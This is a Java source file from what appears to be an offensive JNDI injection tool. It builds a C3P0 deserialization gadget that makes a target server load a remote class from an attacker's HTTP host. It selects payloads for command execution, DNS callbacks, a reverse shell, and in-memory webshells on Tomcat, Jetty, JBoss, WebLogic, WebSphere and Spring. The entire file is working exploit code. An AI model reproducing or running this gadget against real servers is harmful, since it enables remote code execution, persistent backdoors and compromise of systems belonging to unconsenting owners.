package com.feihong.ldap.gadgets;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;

import com.feihong.ldap.template.*;
import com.feihong.ldap.utils.Config;
import com.feihong.ldap.enumtypes.PayloadType;
import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;


public class C3P0 {
    public static byte[] getBytes(PayloadType type, String... param) throws Exception {

        String className;
        switch (type){
            case command:
                CommandTemplate commandTemplate = new CommandTemplate(param[0]);
                commandTemplate.cache();
                className = commandTemplate.getClassName();
                break;
            case dnslog:
                DnslogTemplate dnslogTemplate = new DnslogTemplate(param[0]);
                dnslogTemplate.cache();
                className = dnslogTemplate.getClassName();
                break;
            case reverseshell:
                ReverseShellTemplate reverseShellTemplate = new ReverseShellTemplate(param[0], param[1]);
                reverseShellTemplate.cache();
                className = reverseShellTemplate.getClassName();
                break;
            case tomcatecho:
                className = TomcatEchoTemplate.class.getName();
                break;
            case springecho:
                className = SpringEchoTemplate.class.getName();
                break;
            case weblogicecho:
                className = WeblogicEchoTemplate.class.getName();
                break;
            case tomcatmemshell1:
                className = TomcatMemshellTemplate1.class.getName();
                break;
            case tomcatmemshell2:
                className = TomcatMemshellTemplate2.class.getName();
                break;
            case jettymemshell:
                className = JettyMemshellTemplate.class.getName();
                break;
            case jbossmemshell:
                className = JBossMemshellTemplate.class.getName();
                break;
            case weblogicmemshell1:
                className = WeblogicMemshellTemplate1.class.getName();
                break;
            case weblogicmemshell2:
                className = WeblogicMemshellTemplate2.class.getName();
                break;
            case webspherememshell:
                className = WebsphereMemshellTemplate.class.getName();
                break;
            case springmemshell:
                className = SpringMemshellTemplate.class.getName();
                break;
            default:
                throw new IllegalStateException("Unexpected value: " + type);
        }

        PoolBackedDataSource b = PoolBackedDataSource.class.newInstance();
        Field field = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        field.set(b, new PoolSource(className,"http://" + Config.ip + ":" + Config.httpPort + "/"));

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);
        oos.writeObject(b);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }


    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String className;
        private String url;

        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference () throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}
    }
}
